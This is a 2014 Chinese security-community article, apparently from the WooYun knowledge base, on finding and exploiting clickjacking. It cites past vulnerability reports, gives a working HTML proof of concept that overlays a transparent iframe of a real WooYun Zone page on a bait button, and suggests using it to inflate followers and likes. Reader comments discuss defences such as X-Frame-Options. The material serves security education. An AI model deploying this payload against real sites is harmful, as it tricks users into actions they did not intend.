<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">clickjacking漏洞的挖掘与利用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">px1624</a> <span class="bull">·</span> <time title="2014/11/10 16:25" ui-time="" datetime="2014/11/10 16:25" class="published ng-binding ng-isolate-scope">2014/11/10 16:25</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>0x00简介</p><hr><p>1 说起clickjacking，很多人其实都不知道是干嘛的。比起XSS来说，clickjacking显得比较神秘，乌云漏洞库里面的相关的漏洞也不到10条而已。</p><p>2 瞌睡龙之前发过一篇clickjacking的技术文档，主要是介绍clickjacking出现的原因，以及防御的方法。我这里主要是介绍，怎么寻找clickjacking以及怎么去利用。 <a href="http://drops.wooyun.org/papers/104">Clickjacking简单介绍</a></p><p>提醒一下click jacking和json hijacking完全不是一个东西额，这里大家不要混淆了。</p><p>0x01 案例</p><hr><p>1 ClickJacking</p><p><a href="http://wooyun.org/bugs/wooyun-2010-019683">腾讯微博ClickhiJacking</a></p><p><a href="http://wooyun.org/bugs/wooyun-2010-048468">新浪微博点击劫持刷粉丝</a></p><p>2 Xss 结合 ClickJacking</p><p><a href="http://wooyun.org/bugs/wooyun-2010-055526">百度主站反射型XSS漏洞</a></p><p><a href="http://wooyun.org/bugs/wooyun-2010-018358">百度贴吧贴内一处Mouseover XSS利用</a></p><p><a href="http://wooyun.org/bugs/wooyun-2010-072505">百度翻译反射型XSS（点击劫持demo）</a></p><p>可以看到配合clickjacking，某些看起来比较鸡助的XSS或者不起眼的设置，也会产生比较严重的危害额。</p><p>0x02 实例讲解</p><hr><p>说了这么多，不知道有么有理解。看下面的实例吧。</p><p><a href="http://wooyun.org/bugs/wooyun-2010-071676">用另一个低级的漏洞向豌豆荚用户手机后台静默推送并安装任意应用</a></p><p>他这里是将自己设计了一个页面，然后上面伪造了一个领奖按钮，然后将iframe嵌套的原网页的推送与其领奖的按钮进行了重叠。</p><p>不过不知道是洞主笔误，还是洞主对于clickjacking的描述还是有一些错误。</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2014/11/111.jpg"><img alt="" title="11" width="554" height="378" class="aligncenter size-full wp-image-3824" img-src="2014111008254320848.jpg"></a></p><p>这里洞主的描述显然是有问题的。</p><p>正确的原理应该是这样，这个领奖的页面是在下面，而原iframe的那个页面在最上面。然后第一个图由于将iframe完全透明了，所以用户就只能看到下面的那个领奖页面。然后用户点击领奖，其实是点击了上层页面中的推送。</p><p>所以蓝色圈圈那个位置，应该是“上面”而不是“下面”。</p><p>0x03 Zone ClickJacking挖掘</p><hr><p>之前看到瞌睡龙的这个文章的下面，剑心说要赶紧给zone的感谢加上clickjacking的防御。</p><p>然后我看了下，zone的感谢加了个confrim，不过其实这种只是可以减轻clickjacking的威力，并不能得到根治啊，完全可以构造2个点骗用户点击的。</p><p>然后zone的关注、喜欢、不喜欢这些功能也没有防御，目测zone应该是完全没有防御clickjacking。不过试了试，乌云主站还是对clickjacking进行了防御的，会检测url有么有被iframe嵌套。</p><p>下面给个测试poc，有兴趣的可以自己研究研究更好的利用环境。</p><pre><code>#!html
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8" /&gt;
        &lt;title&gt;clickjacking demo&lt;/title&gt;
    &lt;/head&gt;
    &lt;div style="z-index:999;opacity:0.3;width:500px; height:500px;overflow:hidden;position:absolute;top:20px;left:20px;"&gt;
        &lt;iframe id="inner" style="position:absolute;top:140px;width:1000px;height:500px;left:-484px;" src="http://zone.wooyun.org/user/px1624"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
    &lt;button id="anwoa" style="cursor:pointer;z-index:10px;position:absolute;top:225px;left:200px;text-align:center;width:100px;height:57px;"&gt;按我啊&lt;/button&gt;
&lt;/html&gt;
</code></pre><p>利用这个clickjacking的poc代码，就可以给自己刷点乌云zone的粉丝了。</p><p>同时，还可以给自己zone里面的帖子刷喜欢数量。据说这个喜欢数量可是和zone里面的领主算法息息相关的额!</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/1327" rel="bookmark" id="re1">XSS和字符集的那些事儿</a></li><li><a href="http://drops.wooyun.org/tips/151" rel="bookmark" id="re2">Browser Security-同源策略、伪URL的域</a></li><li><a href="http://drops.wooyun.org/web/11539" rel="bookmark" id="re3">XSS Attacks - Exploiting XSS Filter</a></li><li><a href="http://drops.wooyun.org/tips/150" rel="bookmark" id="re4">Browser Security-css、javascript</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-11-17 17:52:29</span></div><p></p><p>我的意思是frame buster防御不了click jacking</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">px1624</span> <span class="reply-time">2014-11-12 01:22:06</span></div><p></p><p>恩，演示代码用你的那个在线工具生成的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2014-11-11 21:25:09</span></div><p></p><p>一看点击劫持的代码里的“button id="anwoa"”就是我的工具生成的.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">MITM</span> <span class="reply-time">2014-11-11 11:43:15</span></div><p></p><p>我觉得直接加X-FRAME-OPTIONS不好么，为什么主站要用Javascript？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">白非白</span> <span class="reply-time">2014-11-11 10:58:23</span></div><p></p><p>http://seclab.stanford.edu/websec/framebusting/index.php<br>两篇：一篇pc，一篇移动</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">px1624</span> <span class="reply-time">2014-11-11 08:47:48</span></div><p></p><p>嗯，主站已经做了防护了。zone没有防御</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-11-11 03:39:41</span></div><p></p><p>主站用的frame buster没用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龍 、</span> <span class="reply-time">2014-11-10 19:25:13</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">px1624</span> <span class="reply-time">2014-11-10 16:57:06</span></div><p></p><p>。。我去！文章内容被阉割了不少啊！这里更正下，乌云的zone里面的感谢，点击后，会弹出一个类似于confirm的框框（应该是用div写的），所以这里clickjacking仍然适用，不过需要点击两次。如果是直接用的confirm的话，浏览器弹窗会置顶显示在最顶层，所以是可以被发现的。</p><p></p></div></div></div></div></div></main>